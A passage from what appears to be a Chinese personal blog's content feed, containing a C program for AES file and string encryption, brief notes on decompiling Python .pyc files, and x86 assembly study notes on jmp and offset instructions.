class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include &quot;aes.h&quot;</span><br><span class="line"></span><br><span class="line">#define MAXLEN 1024</span><br><span class="line"></span><br><span class="line">void getString(char *str, int len)&#123;</span><br><span class="line"></span><br><span class="line">int slen = read(0, str, len);</span><br><span class="line">for(int i = 0; i &lt; slen; i++,str++)&#123;</span><br><span class="line">if(*str == &#x27;\n&#x27;)&#123;</span><br><span class="line">*str = &#x27;\0&#x27;;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void printASCCI(char *str, int len) &#123;</span><br><span class="line">int c;</span><br><span class="line">for(int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">c = (int)*str++;</span><br><span class="line">c = c &amp; 0x000000ff;</span><br><span class="line">printf(&quot;0x%x &quot;, c);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 从标准输入中读取用户输入的字符串</span><br><span class="line"> */</span><br><span class="line">void readPlainText(char *str, int *len) &#123;</span><br><span class="line">int plen;</span><br><span class="line">while(1) &#123;</span><br><span class="line">getString(str, MAXLEN);</span><br><span class="line">plen = strlen(str);</span><br><span class="line">if(plen != 0 &amp;&amp; plen % 16 == 0) &#123;</span><br><span class="line">printf(&quot;你输入的明文为：%s\n&quot;, str);</span><br><span class="line">break;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">printf(&quot;明文字符长度必须为16的倍数,现在的长度为%d\n&quot;, plen);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">*len = plen;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * 把字符串写进文件</span><br><span class="line"> */</span><br><span class="line">void writeStrToFile(char *str, int len, char *fileName) &#123;</span><br><span class="line">FILE *fp;</span><br><span class="line">fp = fopen(fileName, &quot;wb&quot;);</span><br><span class="line">for(int i = 0; i &lt; len; i++)</span><br><span class="line">putc(str[i], fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void aesStrToFile(char *key) &#123;</span><br><span class="line"></span><br><span class="line">char p[MAXLEN];</span><br><span class="line">int plen;</span><br><span class="line">printf(&quot;请输入你的明文，明文字符长度必须为16的倍数\n&quot;);</span><br><span class="line">readPlainText(p,&amp;plen);</span><br><span class="line">printf(&quot;进行AES加密..................\n&quot;);</span><br><span class="line"></span><br><span class="line">aes(p, plen, key);//AES加密</span><br><span class="line"></span><br><span class="line">printf(&quot;加密完后的明文的ASCCI为：\n&quot;);</span><br><span class="line">printASCCI(p, plen);</span><br><span class="line">char fileName[64];</span><br><span class="line">printf(&quot;请输入你想要写进的文件名，比如&#x27;test.txt&#x27;:\n&quot;);</span><br><span class="line">if(scanf(&quot;%s&quot;, fileName) == 1) &#123;</span><br><span class="line">writeStrToFile(p, plen, fileName);</span><br><span class="line">printf(&quot;已经将密文写进%s中了,可以在运行该程序的当前目录中找到它。\n&quot;, fileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * 从文件中读取字符串</span><br><span class="line"> */</span><br><span class="line">int readStrFromFile(char *fileName, char *str) &#123;</span><br><span class="line">FILE *fp = fopen(fileName, &quot;rb&quot;);</span><br><span class="line">if(fp == NULL) &#123;</span><br><span class="line">printf(&quot;打开文件出错，请确认文件存在当前目录下！\n&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int i;</span><br><span class="line">for(i = 0; i &lt; MAXLEN &amp;&amp; (str[i] = getc(fp)) != EOF; i++);</span><br><span class="line"></span><br><span class="line">if(i &gt;= MAXLEN) &#123;</span><br><span class="line">printf(&quot;解密文件过大！\n&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">str[i] = &#x27;\0&#x27;;</span><br><span class="line">fclose(fp);</span><br><span class="line">return i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void deAesFile(char *key) &#123;</span><br><span class="line">char fileName[64];</span><br><span class="line">char c[MAXLEN];//密文字符串</span><br><span class="line">printf(&quot;请输入要解密的文件名，该文件必须和本程序在同一个目录\n&quot;);</span><br><span class="line">if(scanf(&quot;%s&quot;, fileName) == 1) &#123;</span><br><span class="line">int clen = readStrFromFile(fileName, c);</span><br><span class="line">printf(&quot;开始解密.........\n&quot;);</span><br><span class="line">deAes(c, clen, key);</span><br><span class="line">printf(&quot;解密后的明文ASCII为：\n&quot;);</span><br><span class="line">printASCCI(c, clen);</span><br><span class="line">printf(&quot;明文为：%s\n&quot;, c);</span><br><span class="line">writeStrToFile(c,clen,fileName);</span><br><span class="line">printf(&quot;现在可以打开%s来查看解密后的密文了！\n&quot;,fileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void aesFile(char *key) &#123;</span><br><span class="line">char fileName[64];</span><br><span class="line">char fileP[MAXLEN];</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入要加密的文件名，该文件必须和本程序在同一个目录\n&quot;);</span><br><span class="line">if(scanf(&quot;%s&quot;, fileName) == 1) &#123;</span><br><span class="line">readStrFromFile(fileName, fileP);</span><br><span class="line">int plen = strlen(fileP);</span><br><span class="line">printf(&quot;开始加密.........\n&quot;);</span><br><span class="line">printf(&quot;加密前文件中字符的ASCII为：\n&quot;);</span><br><span class="line">printASCCI(fileP, plen);</span><br><span class="line"></span><br><span class="line">aes(fileP, plen, key);//开始加密</span><br><span class="line"></span><br><span class="line">printf(&quot;加密后的密文ASCII为：\n&quot;);</span><br><span class="line">printASCCI(fileP, plen);</span><br><span class="line">writeStrToFile(fileP,plen,fileName);</span><br><span class="line">printf(&quot;已经将加密后的密文写进%s中了\n&quot;,fileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char const *argv[]) &#123;</span><br><span class="line"></span><br><span class="line">char key[17];</span><br><span class="line">printf(&quot;请输入16个字符的密钥：\n&quot;);</span><br><span class="line">int klen;</span><br><span class="line">while(1)&#123;</span><br><span class="line">getString(key,17);</span><br><span class="line">klen = strlen(key);</span><br><span class="line">if(klen != 16)&#123;</span><br><span class="line">printf(&quot;请输入16个字符的密钥,当前密钥的长度为%d\n&quot;,klen);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">printf(&quot;你输入的密钥为：%s\n&quot;,key);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(&quot;输入&#x27;s&#x27;表示要加密输入的字符串,并将加密后的内容写入到文件\n&quot;);</span><br><span class="line">printf(&quot;请输入要功能选项并按回车，输入&#x27;f&#x27;表示要加密文件\n&quot;);</span><br><span class="line">printf(&quot;输入&#x27;p&#x27;表示要解密文件\n&quot;);</span><br><span class="line">char c;</span><br><span class="line">if(scanf(&quot;%s&quot;,&amp;c) == 1) &#123;</span><br><span class="line">if(c == &#x27;s&#x27;)</span><br><span class="line">aesStrToFile(key);//用AES加密字符串，并将字符串写进文件中</span><br><span class="line">else if(c == &#x27;p&#x27;)</span><br><span class="line">deAesFile(key);//把文件中的密文解密，并写回文件中</span><br><span class="line">else if(c == &#x27;f&#x27;)//用AES加密文件</span><br><span class="line">aesFile(key);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加密算法 </tag>
            
            <tag> 对称加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PYC文件逆向</title>
      <link href="/2025/03/10/re/PYC%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91/"/>
      <url>/2025/03/10/re/PYC%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="PYC文件逆向"><a href="#PYC文件逆向" class="headerlink" title="PYC文件逆向"></a>PYC文件逆向</h1><h2 id="pyc文件是什么？"><a href="#pyc文件是什么？" class="headerlink" title="pyc文件是什么？"></a>pyc文件是什么？</h2><p>pyc是一种二进制文件，是由Python文件经过编译后所生成的文件，它是一种字节码文件，Python文件变成pyc文件后，加载的速度有所提高，最终经过python解释器转换成机器码运行</p><h2 id="pyc文件有什么用？"><a href="#pyc文件有什么用？" class="headerlink" title="pyc文件有什么用？"></a>pyc文件有什么用？</h2><ul><li>让python文件的加载更快</li><li>可通过pyc文件得到py文件的源码</li></ul><h2 id="pyc文件怎么获得"><a href="#pyc文件怎么获得" class="headerlink" title="pyc文件怎么获得"></a>pyc文件怎么获得</h2><ul><li>通过exe转py</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor-ng.py white_give.exe</span><br></pre></td></tr></table></figure><p>（详细看文章exe转py）</p><ul><li>通过py转pyc</li></ul><ol><li><p>命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.6 -m py_compile test.py</span><br></pre></td></tr></table></figure><p>2.脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import py_compile  </span><br><span class="line">&gt;&gt;&gt; py_compile.compile(&#x27;test.py&#x27;)</span><br></pre></td></tr></table></figure></li></ol><h2 id="pyc文件反编译"><a href="#pyc文件反编译" class="headerlink" title="pyc文件反编译"></a>pyc文件反编译</h2><p>通过pyc文件的反编译可以得到py文件的原码 对逆向工作有帮助</p><ol><li><p>通过uncompyle6</p><p>在该文件目录下打开终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 -o test.py test.pyc</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 test.pyc &gt; test.py</span><br></pre></td></tr></table></figure></li><li><p>通过网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tool.lu/pyc/</span><br></pre></td></tr></table></figure></li></ol><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240320215045304.png" alt="image-20240320215045304"></p><p>得到源码</p><ol start="3"><li>在python版本为3.9或更高无法使用uncompyle6反编译，这时候可以使用pycdc</li></ol>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X86汇编语言学习笔记2</title>
      <link href="/2024/08/10/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/"/>
      <url>/2024/08/10/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编语言学习笔记2"><a href="#汇编语言学习笔记2" class="headerlink" title="汇编语言学习笔记2"></a>汇编语言学习笔记2</h1><p><strong>实验七</strong></p><p>就是将一数据段拆开放进另一个数据段，但是有很多坑，建议自己写出来了再对比</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">assume cs:a</span><br><span class="line">data segment</span><br><span class="line">db &#x27;1975&#x27;,&#x27;1976&#x27;,&#x27;1977&#x27;,&#x27;1978&#x27;,&#x27;1979&#x27;,&#x27;1980&#x27;,&#x27;1981&#x27;,&#x27;1982&#x27;,&#x27;1983&#x27;</span><br><span class="line">db &#x27;1984&#x27;,&#x27;1985&#x27;,&#x27;1986&#x27;,&#x27;1987&#x27;,&#x27;1988&#x27;,&#x27;1989&#x27;,&#x27;1990&#x27;,&#x27;1991&#x27;,&#x27;1992&#x27;</span><br><span class="line">db &#x27;1993&#x27;,&#x27;1994&#x27;,&#x27;1995&#x27;</span><br><span class="line"></span><br><span class="line">dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514</span><br><span class="line">dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000</span><br><span class="line"></span><br><span class="line">dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226</span><br><span class="line">dw 11542,14430,15257,17800</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">table segment</span><br><span class="line">db 21 dup(&#x27;year summ ne ?? &#x27;)</span><br><span class="line">table ends</span><br><span class="line"></span><br><span class="line">a segment</span><br><span class="line">start:  mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,table</span><br><span class="line">mov es,ax</span><br><span class="line">mov si,0</span><br><span class="line">mov bx,0</span><br><span class="line">mov bp,168</span><br><span class="line">mov cx,21</span><br><span class="line">s:  push cx</span><br><span class="line">mov di,0</span><br><span class="line">mov cx,4</span><br><span class="line">s0: mov al,ds:[si]</span><br><span class="line">    mov es:[bx+di],al</span><br><span class="line">mov al,ds:[si+84]</span><br><span class="line">mov es:[bx+di+5],al</span><br><span class="line">inc si</span><br><span class="line">inc di</span><br><span class="line">loop s0</span><br><span class="line">    mov ax,ds:[bp]</span><br><span class="line">    mov es:[bx+10],ax</span><br><span class="line">mov dx,es:[bx+7]</span><br><span class="line">mov ax,es:[bx+5]</span><br><span class="line">div word ptr es:[bx+10]</span><br><span class="line">mov es:[bx+13],ax</span><br><span class="line">add bp,2</span><br><span class="line">add bx,16</span><br><span class="line">pop cx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line"></span><br><span class="line">a ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724030139876.png" alt="image-20240724030139876"></p><h2 id="9-转移指令的原理"><a href="#9-转移指令的原理" class="headerlink" title="9. 转移指令的原理"></a>9. 转移指令的原理</h2><ul><li>8086cpu的转移指令分为以下几类<ul><li>无条件转移指令（如：jmp）</li><li>条件转移指令</li><li>循环指令（如：loop）</li><li>过程</li><li>中断</li></ul></li></ul><h3 id="9-1-操作符offset"><a href="#9-1-操作符offset" class="headerlink" title="9.1 操作符offset"></a>9.1 操作符offset</h3><ul><li>操作符offset在汇编语言中是由编译器处理的符号，他的功能是取得标号的偏移地址</li></ul><p><strong>举例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codeseg segment</span><br><span class="line">start:mov ax,offset start //相当于 mov ax,0  start这条指令的偏移地址是0</span><br><span class="line">s:    mov ax,offset s     //相当于mov ax.3   s这条指令的偏移地址是3</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><strong>实验</strong></p><p>将s处的指令复制到s0处</p><ol><li>代码</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724122910500.png" alt="image-20240724122910500"></p><ol start="2"><li>实现</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724122902202.png" alt="image-20240724122902202"></p><p><strong>如果代码指令过长ax放不下怎么办</strong></p><p><strong>小实验</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724202506276.png" alt="image-20240724202506276"></p><p>我们编写一个机器码有4个字节的代码</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724202611625.png" alt="image-20240724202611625"></p><p>再进行debug调试，在调试的过程中我们发现，由于指令过长所以只存放了前面两个字节的数据，如果说以后我们真的需要offset来转移指令应当注意被转移指令的长度</p><h3 id="9-2-jmp指令"><a href="#9-2-jmp指令" class="headerlink" title="9.2 jmp指令"></a>9.2 jmp指令</h3><ul><li><p><code>jmp</code>为无条件转移，可以只修改<code>IP</code>，也可以同时修改<code>CS:IP</code></p></li><li><p><code>jmp</code>指令要给出两种信息</p><ul><li>转移的目的地址</li><li>转移的距离（段间转移，段内短转移，段内近转移）</li></ul></li></ul><h3 id="9-3-依据位移进行转移的jmp指令"><a href="#9-3-依据位移进行转移的jmp指令" class="headerlink" title="9.3 依据位移进行转移的jmp指令"></a>9.3 依据位移进行转移的jmp指令</h3><ul><li><pre><code>jmp short 标号（转移标号处执行指令）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  这种格式的 jmp 指令实现的是段内**短**转移，它对IP的修改范围为-128~127，也就是说，它向前转移时可以最多越过128个字节，向后转移可以最多越过127个字节。(为什么负数可以到-128，详情请看原码，补码，反码的学习)</span><br><span class="line"></span><br><span class="line">  **示例**</span><br><span class="line"></span><br><span class="line">  ![image-20240724124350840](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724124350840.png)</span><br><span class="line"></span><br><span class="line">  ![image-20240724124422603](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724124422603.png)</span><br><span class="line"></span><br><span class="line">  程序执行后，ax中的值为1，因为执行jmp shorts后，越过了add ax,1 ，IP 指向了标号 s处的 inc ax。也就是说，程序只进行了一次ax加01操作。</span><br><span class="line"></span><br><span class="line">* 汇编指令jmp short s 对应的机器指令</span><br><span class="line"></span><br><span class="line">  1. 先观察一下其他的指令于机器码</span><br><span class="line"></span><br><span class="line">  ![image-20240724124754961](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724124754961.png)</span><br><span class="line"></span><br><span class="line">  可以看到，在一般的汇编指会中，汇编指会中的idata(立即数)，不论它是表示一个数据还是内存单元的偏移地址，都会在对应的机器指令中出现，因为CPU执行的是机器指会，它必须要处理这些数据或地址。</span><br><span class="line"></span><br><span class="line">  2. 再看看jmp short s 对应的机器指令</span><br><span class="line"></span><br><span class="line">     ![image-20240724125315581](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724125315581.png)</span><br><span class="line"></span><br><span class="line">     可以看到，Debug 将imp shorts中的s表示为inc ax指令的偏移地址8，并将jmp shorts表示为jmp 0008，表示转移到cs:0008处。</span><br><span class="line"></span><br><span class="line">     再观察机器码，发现jmp 0008 (Debug 中的表示)或jmp short s(汇编语言中的表示)所对应的机器码为EB 03，注意，这个机器码中竟然不包含转移的目的地址。</span><br><span class="line"></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">* 由上面引出问题，没有机器码指出要转移的地址，cpu是怎么知道要转移到哪里的呢?</span><br><span class="line"></span><br><span class="line">  **小实验**</span><br><span class="line"></span><br><span class="line">  我们在jmp要跳转的指令前添加代码，再来进行观察</span><br><span class="line"></span><br><span class="line">  ![image-20240724130200929](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724130200929.png)</span><br><span class="line"></span><br><span class="line">  ![image-20240724130240124](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724130240124.png)</span><br><span class="line"></span><br><span class="line">  我们发现当与要跳转的指令差了6个机器码时，03变成了06</span><br><span class="line"></span><br><span class="line">  ![image-20240724130346609](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724130346609.png)</span><br><span class="line"></span><br><span class="line">  ![image-20240724130333732](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724130333732.png)</span><br><span class="line"></span><br><span class="line">  我们发现当与要跳转的指令差了5个机器码时，03变成了05</span><br><span class="line"></span><br><span class="line">  **总结：**机器指令中并不包含转移的目的地址，因为cpu不需要这个目的地址就可以实现对ip的修改</span><br><span class="line"></span><br><span class="line">* jmp short s 指令的读取和执行过程</span><br><span class="line"></span><br><span class="line">  ![image-20240724125315581](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724125315581.png)</span><br><span class="line"></span><br><span class="line">  (1)(CS)=076AH，(IP)=0003，CS:IP指向EB 03(jmp short s的机器码)</span><br><span class="line">  (2)读取指令码EB 03进入指会缓冲器</span><br><span class="line">  (3)(IP)=(IP)+所读取指令的长度=(IP)+2=0005，CS:IP指向add ax,1</span><br><span class="line">  (4)CPU指行指会缓冲器中的指合EB03</span><br><span class="line">  (5)指会EB 03执行后，(IP)=000AH，CS:IP指向inc ax</span><br><span class="line"></span><br><span class="line">* 我们现在就可以理解为什么有偏移范围-128~127，因为，指令 `jmp short 标号`的功能实际为`(ip)=(ip)+8位位移`</span><br><span class="line">  * (1)8位位移=“标号”处的地址-jmp指令后的第一个字节的地址</span><br><span class="line">  * (2)short指明此处的位移为8位位移</span><br><span class="line">  * (3)8位位移的范围为-128~127，用补码表示</span><br><span class="line">  * (4)8位位移由编译程序在编译时算出</span><br><span class="line"></span><br><span class="line">* 与 `jmp short 标号`功能相近的指令格式</span><br><span class="line"></span><br></pre></td></tr></table></figure>jmp near ptr 标号实现的是段内近转移功能：(ip)=(ip)+16位位移<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  说明：</span><br><span class="line"></span><br><span class="line">  * (1)16位位移=“标号”处的地址-jmp指令后的第一个字节的地址</span><br><span class="line">  * (2)near ptr指明此处的位移为16位位移，进行的是段内近转移</span><br><span class="line">  * (3)8位位移的范围为-32769~32767，用补码表示</span><br><span class="line">  * (4)16位位移由编译程序在编译时算出</span><br><span class="line"></span><br><span class="line">### 9.4 转移的目的地址在指令中的jmp指令</span><br><span class="line"></span><br><span class="line">* 前面讲的jmp指令，其对应的机器码中并没有转移目的地址，而是相对于当前IP的转移位移</span><br><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  jmp far ptr 标号 </span><br></pre></td></tr></table></figure>实现的是段间转移，又称为远转移功能：* (CS)=标号所在段的段地址* (IP)=标号所在段中的偏移地址* far ptr指明了指令用标号的段地址和偏移地址修改CS和IP。</code></pre></li><li><p><strong>示例</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724162800552.png" alt="image-20240724162800552"></p><p>我们再查看机器码</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724163053315.png" alt="image-20240724163053315"></p><p>我们发现它使用的还是段内跳转，但是多了三个空字节</p><p>我们再添加一点数据</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724163236891.png" alt="image-20240724163236891"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724163019916.png" alt="image-20240724163019916"></p><p>发现jmp指令在机器码还是debug中都给出了详细的段地址加偏移地址</p></li></ul><h3 id="9-5-转移的地址在寄存器中的jmp指令"><a href="#9-5-转移的地址在寄存器中的jmp指令" class="headerlink" title="9.5 转移的地址在寄存器中的jmp指令"></a>9.5 转移的地址在寄存器中的jmp指令</h3><ul><li><pre><code>jmp 16位寄存器<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 